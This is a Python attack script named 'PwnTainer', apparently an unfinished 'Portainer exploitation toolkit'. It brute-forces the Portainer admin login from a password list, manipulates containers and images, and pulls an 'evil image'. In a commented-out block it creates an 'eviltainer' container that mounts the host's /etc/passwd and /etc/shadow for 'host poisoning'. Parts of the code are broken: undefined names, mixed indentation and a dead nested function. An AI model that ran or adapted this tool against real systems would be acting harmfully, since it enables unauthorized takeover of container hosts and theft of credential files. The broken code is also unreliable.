from multiprocessing import Pool
from pprint import pprint
from pyfiglet import Figlet
import argparse
import json
import sys

from modules import auth
from modules import containers
from modules import image

while True:
    font = Figlet(font='graffiti')
    print(font.renderText('PwnTainer'))
    break


def bruteforce(pw_list):
	with open(pw_list) as pass_list:
		passwords = pass_list.readlines()

	with Pool(4) as pool:
		results = pool.map(a.login, passwords)
		print(results)
'''
def list_containers(host):
	cont = containers.Containers(host,  1)
	print cont.list_containers()
'''

def check_image(name):
	img = image.Image(sys.argv[1], sys.argv[2])
	images = []
	for imag in img.list_images():
		images.append(imag['RepoTags'])
	for im in images:
		if name in str(im[0]):
			return True
		else:
			pass

def pull_image(name):
	img = image.Image(sys.argv[1], 1)
	img.pull_image(name)


def commads():
        _parser = argparse.ArgumentParser(prog='Pwntainer', usage='%(prog)s Host [options]' , description='Portainer exploitaion toolkit: ')
        _parser.add_argument('Host', help='Enter the address of the container running the portainer:192.168.25.101:9000 ')
        
        _authentication = _parser.add_argument_group('Authentucation',)
        _authentication.add_argument('-p' , '--password', metavar=''  ,help='If the default username is admin, provide a passwor: ',  required=True)
        _authentication.add_argument('-l' , '--passlist', metavar=''  ,help='provide a passlist incase of brutefoce')

        _containers = _parser.add_argument_group('Container Manupilation')
        _containers.add_argument('-lc' , '--listc'  , help='List containers in the edpoint.', action='store_true')
        _containers.add_argument('-cc' , '--creat' , help='Create a container in the endpoint. ', action='store_true')
        _containers.add_argument('-sc' , '--start' , help='Start a container in the endpoint. ', action ='store_true')

        _images = _parser.add_argument_group('Images Manupilation')
        _images.add_argument('-li' , '--listi'  ,help='List images available in the endpoint. ', action='store_true')
        _images.add_argument('-pi' , '--pull'  ,help='Pull an evil image to the endpoint.', action='store_true')
        _images.add_argument('-di' , '--delete',help='Delete image', action='store_true')

        _attack = _parser.add_argument_group('Attacks Surfac')
        _attack.add_argument('-pj' , '--pwnwithJohn', metavar='')
        _attack.add_argument('-wp' , '--webpwn', metavar='')
        _attack.add_argument('-sp' , '--sshpwn', metavar='')
        _attack.add_argument('-a', '--all', metavar='')
        
        _commands = _parser.parse_args()
        
        if _commands.Host and _commands.password:
            _authenticate = auth.Auth(_commands.Host)
            _authenticate.login(_commands.password)
            
            while True:
                print '\033[1;35;40m[*]Authenticated.'
                break
            
            _token = str(_authenticate.get_jwt())
            _container =  containers.Containers(_commands.Host, 1, _token)
            _images = image.Image(_commands.Host, 1, _token)

            if _commands.listc:
                _containers = _container.list_containers()
                _containers = json.dumps(_containers, indent=4, sort_keys=True)
                print _containers

            elif _commands.creat:
                _containerName = raw_input('\033[1;33;40m[+]Enter container to create: ')
                _mountVolume = raw_input('\033[1;33;40m[+]Enter the volume to mount: ')
                _container.create_container(_containerName, _mountVolume)

            elif _commands.start:
                print'\033[1;35;40m[*]Starting containers..'
                if _container.start_container() == 'True':
                    print'\033[1;35;40m[*]Container successfully started.'
                
                else:
                    print'\033[1;31;40m[-]Unable to start container...'

            elif _commands.listi:
                _images = _images.list_images()
                _images = json.dumps(_images, indent=4, sort_keys=True)
                print _images

            elif _commands.pull:
                _imageName = raw_input('\033[1;33;40m[+]Enter the image to pull: ')
                print '\033[1;33;40m[+]Pulling {} this will take some time...'.format(_imageName)

                def check_image(_imageName):
                    _images.pull_image(_imageName)
                    if 'success':
                        print'\033[1;35;40m[*]Image pulled.'
                    else :
                        print'\033[1;31;40m[-] {}'.format(_pull)
        
            elif _commands.delete:
                _imageName = raw_input('\033[1;33;40m[+]Enter the image to delete: ')
                _images.remove_image(_imageName)

            else:
                print'\033[1;31;40m[-]Supply a valid command!'
                _commands.help

def main():
        
        commads()
        """
        print("\n")
	print("[*] Checking if the evil pwntainer image exists...")
	if check_image("ubuntu:18.04"):
		print("[+] Pwntainer evil image exists")
	else:
		print("[-] Evil pwnstainer image not found, fetching...")
		pull_image("ubuntu:18.04")
		print("[+]Image pull successful")

	# Start the evil container, mounting the various host filesystems.
	pwntainer = containers.Containers(sys.argv[1], 1)
	print("[*] Starting the pwntainer evil container")
	pwntainer.create_container("eviltainer", ["/etc/passwd:/etc/passwd", "/etc/shadow:/etc/shadow"])
	print("[+] Evil container created successfully")
	print("[*] Starting the eviltainer container")
	pwntainer.start_container()
	print("[*] Starting host poisoning")
	# Todo exec on container

        """
if __name__=="__main__":
	main()
